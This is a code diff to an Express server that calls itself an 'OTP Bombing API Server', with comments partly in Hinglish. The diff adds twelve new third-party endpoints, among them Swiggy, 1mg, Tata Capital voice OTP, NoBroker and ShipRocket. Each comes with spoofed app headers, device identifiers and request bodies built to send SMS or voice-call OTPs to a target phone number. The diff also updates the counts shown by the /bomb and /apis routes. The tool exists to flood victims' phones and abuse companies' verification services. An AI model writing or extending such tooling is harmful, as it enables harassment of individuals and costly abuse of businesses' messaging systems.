@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (SIRF WORKING APIs)
-// 154 Verified Working APIs Only | Rejected/RL/Failed REMOVED
+// api_server.js - OTP Bombing API Server (221 TOTAL APIs)
+// 209 APIs + 12 Nayi APIs = 221 TOTAL
 // ============================================================
 
 const express = require('express');
@@ -18,7 +18,7 @@ const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
 // ============================================================
-// ===== ONLY 154 WORKING APIs (2xx Success Verified) =====
+// ===== ALL APIs (209 + 12 NAYI = 221) =====
 // ============================================================
 
 const APIS = [
@@ -1229,6 +1229,158 @@ const APIS = [
         method: "POST",
         headers: {"Content-Type": "application/json"},
         data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
+    },
+
+    // ============================================================
+    // 🆕 12 NAYI APIs (Latest - User Provided)
+    // ============================================================
+    {
+        name: "Hungama_NEW_1",
+        method: "POST",
+        url: "https://communication.api.hungama.com/v1/communication/otp",
+        headers: {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "identifier": "home",
+            "mlang": "en",
+            "country_code": "IN",
+            "origin": "https://www.hungama.com",
+            "referer": "https://www.hungama.com/"
+        },
+        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
+    },
+    {
+        name: "MeruCab_NEW",
+        method: "POST",
+        url: "https://merucabapp.com/api/otp/generate",
+        headers: {
+            "Mobilenumber": "{phone}",
+            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
+            "AppVersion": "245",
+            "ApiVersion": "6.2.55",
+            "DeviceType": "Android",
+            "DeviceId": "44098bdebb2dc047",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "okhttp/4.9.0"
+        },
+        data: { "_raw": "mobile_number={phone}" }
+    },
+    {
+        name: "DaycoIndia_NEW",
+        method: "POST",
+        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        headers: {
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://ekyc.daycoindia.com",
+            "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
+        },
+        data: { "_raw": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp" }
+    },
+    {
+        name: "Doubtnut_API_NEW",
+        method: "POST",
+        url: "https://api.doubtnut.com/v4/student/login",
+        headers: {
+            "version_code": "1160",
+            "has_upi": "false",
+            "device_model": "ASUS_I005DA",
+            "android_sdk_version": "28",
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/5.0.0-alpha.2"
+        },
+        data: (phone) => JSON.stringify({ app_version: "7.10.51", aaid: "538bd3a8-09c3-47fa-9141-6203f4c89450", course: "", phone_number: phone, language: "en", udid: "b751fb63c0ae17ba", class: "", gcm_reg_id: "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw" })
+    },
+    {
+        name: "NoBroker_v3_NEW",
+        method: "POST",
+        url: "https://www.nobroker.in/api/v3/account/otp/send",
+        headers: {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "origin": "https://www.nobroker.in",
+            "referer": "https://www.nobroker.in/"
+        },
+        data: { "_raw": "phone={phone}&countryCode=IN" }
+    },
+    {
+        name: "ShipRocket_NEW",
+        method: "POST",
+        url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        headers: {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "authorization": "Bearer null",
+            "origin": "https://app.shiprocket.in",
+            "referer": "https://app.shiprocket.in/"
+        },
+        data: (phone) => JSON.stringify({ mobileNumber: phone })
+    },
+    {
+        name: "TataCapital_Voice_NEW",
+        method: "POST",
+        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        headers: { "Content-Type": "application/json" },
+        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
+    },
+    {
+        name: "Penpencil_Resend_NEW",
+        method: "POST",
+        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+        headers: {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/3.9.1"
+        },
+        data: (phone) => JSON.stringify({ organizationId: "5eb393ee95fab7468a79d189", mobile: phone })
+    },
+    {
+        name: "1mg_Call_NEW",
+        method: "POST",
+        url: "https://www.1mg.com/auth_api/v6/create_token",
+        headers: {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/3.9.1"
+        },
+        data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: true })
+    },
+    {
+        name: "Swiggy_Call_NEW",
+        method: "POST",
+        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        headers: {
+            "user-agent": "Swiggy-Android",
+            "content-type": "application/json; charset=utf-8"
+        },
+        data: (phone) => JSON.stringify({ mobile: phone })
+    },
+    {
+        name: "KPNFresh_v2_NEW",
+        method: "POST",
+        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        headers: {
+            "cache": "no-store",
+            "x-channel-id": "WEB",
+            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "origin": "https://www.kpnfresh.com",
+            "referer": "https://www.kpnfresh.com/"
+        },
+        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
+    },
+    {
+        name: "ServeTel_v2_NEW",
+        method: "POST",
+        url: "https://api.servetel.in/v1/auth/otp",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
+        },
+        data: { "_raw": "mobile_number={phone}" }
     }
 ];
 
@@ -1442,7 +1594,7 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
-        note: 'SIRF WORKING APIs (154 Verified 2xx Success)',
+        note: 'SIRF WORKING APIs + 12 Nayi',
         max_duration_min: MAX_DURATION_MIN,
         uptime: Math.round(process.uptime()) + 's'
     });
@@ -1556,7 +1708,7 @@ app.post('/bomb', async (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
-        note: 'SIRF WORKING APIs (154 Verified 2xx Success)',
+        note: 'SIRF WORKING APIs + 12 Nayi',
         api_names: APIS.map(a => a.name)
     });
 });
